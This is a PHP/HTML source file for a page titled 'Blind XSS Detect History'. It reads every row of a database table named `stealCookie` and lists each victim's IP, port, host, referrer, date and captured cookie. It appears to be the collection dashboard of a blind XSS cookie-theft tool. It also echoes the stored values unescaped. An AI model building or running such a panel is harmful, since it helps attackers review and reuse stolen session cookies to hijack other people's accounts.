<!DOCTYPE html>
<html>
<head>
	<title>test</title>
	<link rel="stylesheet" href="bulma.css">
	<style>
		.mt-3{
			margin-top: 30px;
		}
	</style>
</head>
<body>
	<div class="container mt-3">
		<div class="level is-mobile">
			<div class="level-item has-text-centered">
				<h1>
					<b>Blind XSS Detect History</b>
				</h1>
			</div>
		</div>
		<!-- <nav class="level is-mobile">
			<div class="level-item has-text-centered">
				<div>
					<p class="heading">Tweets</p>
					<p class="title">3,456</p>
				</div>
			</div>
			<div class="level-item has-text-centered">
				<div>
					<p class="heading">Following</p>
					<p class="title">123</p>
				</div>
			</div>
			<div class="level-item has-text-centered">
				<div>
					<p class="heading">Followers</p>
					<p class="title">456K</p>
				</div>
			</div>
			<div class="level-item has-text-centered">
				<div>
					<p class="heading">Likes</p>
					<p class="title">789</p>
				</div>
			</div>
		</nav> -->
	</div>
	<div class="container-fluid mt-3">
		<table class="table is-bordered is-striped is-narrow is-hoverable is-fullwidth">
			<thead>
				<tr>
					<th><abbr title="Position">ID</abbr></th>
					<th>IP</th>
					<th>Port</th>
					<!-- <th>Protocol</th> -->
					<th>Host</th>
					<!-- <th>Agent</th>
					<th>Method</th> -->
					<th>Reference</th>
					<th>Date</th>
					<th>Cookie</th>
				</tr>
			</thead>
			<?php
				require 'config.php';
				$CS_data = array();
				$CS_sqlquery = "SELECT * FROM `stealCookie`";
				if ($CS_result = $conn->query($CS_sqlquery)) {
					while ($CS_rows = $CS_result->fetch_array(MYSQLI_ASSOC)) {
						$CS_data[] = $CS_rows;
					}
					$CS_result->close();
				}
				//$conn->close();
			?>
			<tbody>
				<?php
					foreach ($CS_data as $CS_row) {
						echo "<tr>";
						echo "<th>".$CS_row['id']."</th>";
						echo "<td>".$CS_row['ip']."</td>";
						echo "<td>".$CS_row['port']."</td>";
						// echo "<td>".$CS_row['protocol']."</td>";
						echo "<td>".$CS_row['host']."</td>";
						// echo "<td>".$CS_row['agent']."</td>";
						// echo "<td>".$CS_row['method']."</td>";
						echo "<td>".$CS_row['reference']."</td>";
						echo "<td>".$CS_row['date']."</td>";
						echo "<td>".$CS_row['cookie']."</td>";
						echo "</tr>";
					}
				?>
			</tbody>
		</table>
	</div>
</body>
</html>